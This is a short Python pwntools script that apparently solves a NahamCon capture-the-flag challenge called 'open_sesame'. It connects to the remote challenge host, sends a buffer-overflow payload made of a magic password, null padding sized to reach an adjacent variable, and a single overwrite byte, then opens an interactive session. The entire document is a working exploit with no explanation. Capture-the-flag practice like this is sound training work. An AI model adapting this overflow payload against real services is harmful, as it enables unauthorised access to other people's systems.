#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("open_sesame")
local = False 
if local:
    p = process("./open_sesame")
    gdb.attach(p,'''''')
else:
    p = remote('challenge.nahamcon.com', 32743)

elf = context.binary = ELF('./open_sesame', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)


payload = b'OpenSesame!!!' + b'\0' * (0x110 - 0x4 - 0xd) + b'\x01'
sl(payload)
p.interactive()